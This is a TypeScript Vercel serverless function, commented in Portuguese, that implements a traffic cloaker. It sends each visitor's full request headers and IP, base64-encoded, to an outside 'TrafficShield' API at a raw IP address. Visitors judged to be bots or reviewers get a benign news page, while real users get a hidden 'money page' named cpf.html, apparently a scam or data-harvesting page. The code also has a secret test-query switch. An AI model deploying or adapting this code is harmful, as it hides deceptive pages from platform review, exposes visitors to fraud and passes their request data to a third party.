import type { VercelRequest, VercelResponse } from '@vercel/node';
import fetch from 'node-fetch';
import { readFileSync } from 'fs';
import { resolve } from 'path';

// Caminhos para as páginas White e Black (Money Page)
const WHITE_PAGE_PATH = resolve(process.cwd(), 'noticia/index.html'); // Safe Page
const BLACK_PAGE_PATH = resolve(process.cwd(), 'cpf.html'); // Money Page

// Tenta ler o conteúdo das páginas uma vez
let whitePageContent: string | null = null;
let blackPageContent: string | null = null;

try {
  whitePageContent = readFileSync(WHITE_PAGE_PATH, 'utf-8');
} catch (error) {
  console.error("Erro ao ler White Page (noticia/index.html):", error);
}

try {
  blackPageContent = readFileSync(BLACK_PAGE_PATH, 'utf-8');
} catch (error) {
  console.error("Erro ao ler Black Page (cpf.html):", error);
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
  // 1. Verificação de Teste (Equivalente ao _check() do PHP)
  if (req.query['TS-BHDNR-84848']) {
    return res.status(200).send('bf9883aa7b');
  }

  try {
    // 2. Coletar Headers (Equivalente ao get_header() do PHP)
    const headers: Record<string, any> = {};
    
    // Coleta todos os headers da requisição e converte para o formato $_SERVER (HTTP_...)
    for (const key in req.headers) {
        // Converte para maiúsculas e substitui hífens por underscores
        headers['HTTP_' + key.toUpperCase().replace(/-/g, '_')] = req.headers[key];
    }
    
    // Adiciona os headers específicos do TrafficShield (do seu código PHP)
    headers['TS_BHDNR_74191'] = '900661405756137';
    headers['TS_BHDNR_74194'] = 'bf9883aa7b'; 
    
    // Adiciona informações de endereço e URI (equivalente a $_SERVER)
    // PRIORIZA O IP REAL FORNECIDO PELA VERCELL (x-forwarded-for ou x-real-ip)
    headers['REMOTE_ADDR'] = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket.remoteAddress;
    headers['REQUEST_URI'] = req.url || '/';
    headers['HTTP_HOST'] = req.headers.host;
    headers['REQUEST_METHOD'] = req.method;
    
    // 3. Fazer POST para API TrafficShield (Equivalente ao https_request() do PHP)
    const trafficShieldResponse = await fetch('http://198.211.101.164/v2/logic/cloaker', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      // Codifica os headers em base64, como o PHP fazia
      body: `headers=${Buffer.from(JSON.stringify(headers)).toString('base64')}`
    });

    const result = await trafficShieldResponse.json();

    // 4. Processar Resposta (Equivalente ao main() e get_url() do PHP)
    
    // CASO 1: Tráfego Bloqueado (Bot) - Retornar conteúdo alternativo (Safe Page)
    if (result && result.zrc) {
      // O TrafficShield retorna o conteúdo da Safe Page codificado em zrc
      const content = Buffer.from(result.zrc, 'base64').toString('utf-8');
      
      // Envia o conteúdo da Safe Page diretamente
      return res.status(200).send(content);
      
    } 
    
    // CASO 2: Tráfego Aprovado (Usuário real) - Servir a Black Page (cpf.html)
    else if (result && result.url) {
      // O TrafficShield retorna a URL de destino (Money Page).
      // Como queremos servir o conteúdo localmente (cpf.html), usamos o conteúdo lido.
      
      if (blackPageContent) {
        return res.status(200).send(blackPageContent);
      } else {
        // Se a Black Page não puder ser lida, faz o redirecionamento para a URL do TrafficShield
        const code = result.http_code || 302;
        res.writeHead(code, { 'Location': result.url });
        return res.end();
      }
      
    } 
    
    // CASO 3: Falha na Comunicação ou Tráfego Não-Classificado - Servir White Page (Fail-Safe)
    else {
      // Se a API não retornar nem zrc nem url, é um comportamento inesperado.
      // Retornamos a White Page (noticia/index.html)
      if (whitePageContent) {
        return res.status(200).send(whitePageContent);
      } else {
        // Se a White Page também não puder ser lida, retorna um erro
        return res.status(500).send('Erro na verificação do cloaker. Conteúdo principal indisponível.');
      }
    }
  } catch (error) {
    console.error('TrafficShield verification error (Fail-Safe):', error);
    
    // Em caso de erro, servir a White Page (Fail-Safe)
    if (whitePageContent) {
        return res.status(200).send(whitePageContent);
    } else {
        return res.status(500).send('Erro crítico na função do cloaker.');
    }
  }
}
